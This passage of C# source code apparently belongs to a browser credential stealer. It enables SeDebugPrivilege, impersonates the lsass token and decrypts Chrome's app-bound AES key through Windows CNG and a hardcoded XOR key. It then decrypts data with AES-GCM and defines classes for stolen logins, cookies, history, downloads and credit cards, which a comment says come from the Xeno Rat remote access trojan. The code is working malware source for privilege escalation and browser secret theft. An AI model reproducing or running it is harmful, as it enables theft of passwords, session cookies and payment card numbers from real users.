                        Array.Copy(output, 0, finalPlain, 0, totalLen2);
                        output = finalPlain;
                    }

                    return output;
                case 3:
                    byte[] xorKey = Convert.FromBase64String("zPihzsVmBbhRdVK6Gi0GHAOinpAnT7L89Zukt1w5I5A=");
                    var imp = new Impersonate();
                    try
                    {
                        imp.Impersonatelsass();

                        byte[] decryptedAESKey = WindowsCNG.Decrypt(kb.EncryptedAesKey, "Google Chromekey1");
                        if (decryptedAESKey == null)
                            return null;

                        // XOR
                        byte[] xoredAESKey = ByteXor(decryptedAESKey, xorKey);
                        if (xoredAESKey == null || xoredAESKey.Length == 0)
                            return null;

                        // Prepare GCM cipher
                        var cipher3 = new GcmBlockCipher(new AesEngine());
                        const int gcmTagBits = 128; // 16 bytes

                        // Build parameters: Key + tag length + IV (AAD = null)
                        var keyParam = new KeyParameter(xoredAESKey);
                        var parameters3 = new AeadParameters(keyParam, gcmTagBits, kb.IV, null);

                        cipher3.Init(false, parameters3);

                        // For BouncyCastle GCM decryption, provide ciphertext concatenated with the tag
                        byte[] ctWithTag3;
                        if (kb.Tag != null && kb.Tag.Length > 0)
                        {
                            ctWithTag3 = new byte[kb.Ciphertext.Length + kb.Tag.Length];
                            Array.Copy(kb.Ciphertext, 0, ctWithTag3, 0, kb.Ciphertext.Length);
                            Array.Copy(kb.Tag, 0, ctWithTag3, kb.Ciphertext.Length, kb.Tag.Length);
                        }
                        else
                        {
                            // If the tag is already appended to ciphertext, just use ciphertext
                            ctWithTag3 = kb.Ciphertext;
                        }

                        // Allocate output buffer
                        int outSize = cipher3.GetOutputSize(ctWithTag3.Length);
                        byte[] outBuf = new byte[outSize];

                        int len3 = cipher3.ProcessBytes(ctWithTag3, 0, ctWithTag3.Length, outBuf, 0);
                        int finalLen3;
                        try
                        {
                            finalLen3 = cipher3.DoFinal(outBuf, len3);
                        }
                        catch (InvalidCipherTextException)
                        {
                            // Authentication failed
                            return null;
                        }

                        int totalLen3 = len3 + finalLen3;
                        if (totalLen3 == outBuf.Length)
                            return outBuf;

                        byte[] finalPlain = new byte[totalLen3];
                        Array.Copy(outBuf, 0, finalPlain, 0, totalLen3);
                        return finalPlain;
                    }
                    finally
                    {
                        // Always undo impersonation
                        try { imp.UnImpersonatelsass(); } catch { /* swallow or log */ }
                    }

            }
            return null;
        }

        // --- Constants ---
        const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        const uint TOKEN_IMPERSONATE = 0x0004;

        const int SecurityImpersonation = 2; // SECURITY_IMPERSONATION_LEVEL
        const int TokenPrimary = 1;
        const int TokenImpersonation = 2;

        const uint GENERIC_ALL = 0x10000000;

        // --- Imports ---
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            int ImpersonationLevel,
            int TokenType,
            out IntPtr phNewToken
        );

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentThread();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        private class Impersonate
        {

            IntPtr hProcess;
            IntPtr hToken;
            IntPtr hDupToken;

            public bool Impersonatelsass()
            {
                var originalToken = WindowsIdentity.GetCurrent().Token;
                try
                {
                    if (!PrivilegeHelper.EnablePrivilege("SeDebugPrivilege")) return false;

                    Process[] procs = Process.GetProcessesByName("lsass");
                    if (procs == null || procs.Length == 0) return false;

                    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, procs[0].Id);
                    if (hProcess == IntPtr.Zero) return false;

                    // Step 2: Open the process token
                    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out hToken))
                    {
                        CloseHandle(hProcess);
                        return false;
                    }

                    if (!DuplicateTokenEx(
                        hToken,
                        GENERIC_ALL,
                        IntPtr.Zero,
                        SecurityImpersonation,
                        TokenImpersonation,
                        out hDupToken))
                    {
                        CloseHandle(hToken);
                        CloseHandle(hProcess);
                        return false;
                    }

                    // Apply token to current thread
                    if (SetThreadToken(IntPtr.Zero, hDupToken))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
                catch
                {
                    return false;
                }
            }

            public void UnImpersonatelsass()
            {
                RevertToSelf();
                CloseHandle(hDupToken);
                CloseHandle(hToken);
                CloseHandle(hProcess);
            }
        }

        public class PrivilegeHelper
        {
            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            internal struct LUID
            {
                public uint LowPart;
                public int HighPart;
            }

            [StructLayout(LayoutKind.Sequential, Pack = 1)]
            internal struct TOKEN_PRIVILEGES
            {
                public int PrivilegeCount;
                public LUID Luid;
                public int Attributes;
            }

            [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
            static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true)]
            static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

            [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
            static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
                ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

            [DllImport("kernel32.dll", ExactSpelling = true)]
            static extern IntPtr GetCurrentProcess();

            const uint TOKEN_ADJUST_PRIVILEGES = 0x20;
            const uint TOKEN_QUERY = 0x8;
            const int SE_PRIVILEGE_ENABLED = 0x2;

            public static bool EnablePrivilege(string privilege)
            {
                IntPtr hToken;

                if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
                    return false;


                if (!LookupPrivilegeValue(null, privilege, out LUID luid))
                    return false;

                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = luid,
                    Attributes = SE_PRIVILEGE_ENABLED
                };

                if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                    return false;

                return true;
            }
        }


        public static class WindowsCNG
        {
            private const uint ERROR_SUCCESS = 0x0;

            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
            private static extern int NCryptOpenStorageProvider(
                out IntPtr phProvider,
                string pszProviderName,
                uint dwFlags);

            [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
            private static extern int NCryptOpenKey(
                IntPtr hProvider,
                out IntPtr phKey,
                string pszKeyName,
                int dwLegacyKeySpec,
                int dwFlags);

            [DllImport("ncrypt.dll")]
            private static extern int NCryptDecrypt(
                IntPtr hKey,
                byte[] pbInput,
                int cbInput,
                IntPtr pPaddingInfo,
                [Out] byte[] pbOutput,
                int cbOutput,
                out int pcbResult,
                int dwFlags);

            [DllImport("ncrypt.dll")]
            private static extern int NCryptFreeObject(IntPtr hObject);

            /// <summary>
            /// Decrypts data using a persisted Windows CNG key.
            /// </summary>
            /// <param name="inputData">Encrypted byte array</param>
            /// <param name="keyName">Name of the persisted key in Windows CNG</param>
            /// <returns>Decrypted bytes on success, or null on failure</returns>
            public static byte[] Decrypt(byte[] inputData, string keyName)
            {
                if (inputData == null || inputData.Length == 0 || string.IsNullOrEmpty(keyName))
                    return null;

                IntPtr provider = IntPtr.Zero;
                IntPtr keyHandle = IntPtr.Zero;

                try
                {
                    // 1) Open the Microsoft Software Key Storage Provider
                    int status = NCryptOpenStorageProvider(out provider, "Microsoft Software Key Storage Provider", 0);
                    if (status != ERROR_SUCCESS) return null;

                    // 2) Open the persisted key
                    status = NCryptOpenKey(provider, out keyHandle, keyName, 0, 0);
                    if (status != ERROR_SUCCESS) return null;

                    // 3) Query required buffer size
                    int requiredLength;
                    status = NCryptDecrypt(
                        keyHandle,
                        inputData,
                        inputData.Length,
                        IntPtr.Zero, // no padding info for default
                        null,
                        0,
                        out requiredLength,
                        0x40   // NCRYPT_SILENT_FLAG
                        );

                    if (status != ERROR_SUCCESS) return null;

                    // 4) Allocate buffer and decrypt
                    byte[] decryptedData = new byte[requiredLength];
                    int actualLength;
                    status = NCryptDecrypt(
                        keyHandle,
                        inputData,
                        inputData.Length,
                        IntPtr.Zero,
                        decryptedData,
                        decryptedData.Length,
                        out actualLength,
                        0x40   // NCRYPT_SILENT_FLAG
                        );

                    if (status != ERROR_SUCCESS) return null;

                    // Trim to actual length
                    if (actualLength == decryptedData.Length)
                        return decryptedData;

                    byte[] final = new byte[actualLength];
                    Array.Copy(decryptedData, final, actualLength);
                    return final;
                }
                catch
                {
                    return null;
                }
                finally
                {
                    if (keyHandle != IntPtr.Zero) NCryptFreeObject(keyHandle);
                    if (provider != IntPtr.Zero) NCryptFreeObject(provider);
                }
            }
        }

        //The following 5 classes are taken from Xeno Rat https://github.com/moom825/xeno-rat
        public class Login
        {
            public Login(string url, string username, string password)
            {
                this.url = url;
                this.username = username;
                this.password = password;
            }

            public string url { get; set; }
            public string username { get; set; }
            public string password { get; set; }
        }

        public class Cookie
        {
            public Cookie(string host, string name, string path, string value, long expires)
            {
                this.host = host;
                this.name = name;
                this.path = path;
                this.value = value;
                const long minUnixTimestamp = 0; // Minimum valid Unix timestamp (January 1, 1970)
                const long maxUnixTimestamp = 2147483647; // Maximum valid Unix timestamp (January 19, 2038)
                long unixExpires = (expires / 1000000) - 11644473600;
                if (unixExpires > maxUnixTimestamp || unixExpires < minUnixTimestamp)
                {
                    unixExpires = maxUnixTimestamp - 1;
                }
                this.expires = unixExpires;
            }

            public string host { get; set; }
            public string name { get; set; }
            public string path { get; set; }
            public string value { get; set; }
            public long expires { get; set; }
        }

        public class WebHistory
        {
            public WebHistory(string url, string title, long timestamp)
            {
                this.url = url;
                this.title = title;
                const long minUnixTimestamp = 0; // Minimum valid Unix timestamp (January 1, 1970)
                const long maxUnixTimestamp = 2147483647; // Maximum valid Unix timestamp (January 19, 2038)
                long unixExpires = (timestamp / 1000000) - 11644473600;
                if (unixExpires > maxUnixTimestamp || unixExpires < minUnixTimestamp)
                {
                    unixExpires = maxUnixTimestamp - 1;
                }
                this.timestamp = unixExpires;
            }

            public string url { get; set; }
            public string title { get; set; }
            public long timestamp { get; set; }
        }

        public class Download
        {
            public Download(string tab_url, string target_path)
            {
                this.tab_url = tab_url;
                this.target_path = target_path;
            }

            public string tab_url { get; set; }
            public string target_path { get; set; }
        }

        public class CreditCard
        {
            public CreditCard(string name, string month, string year, string number, long date_modified)
            {
                this.name = name;
                this.month = month;
                this.year = year;
                this.number = number;
                this.date_modified = date_modified;
            }

            public string name { get; set; }
            public string month { get; set; }
            public string year { get; set; }
            public string number { get; set; }
            public long date_modified { get; set; }
        }
    }
}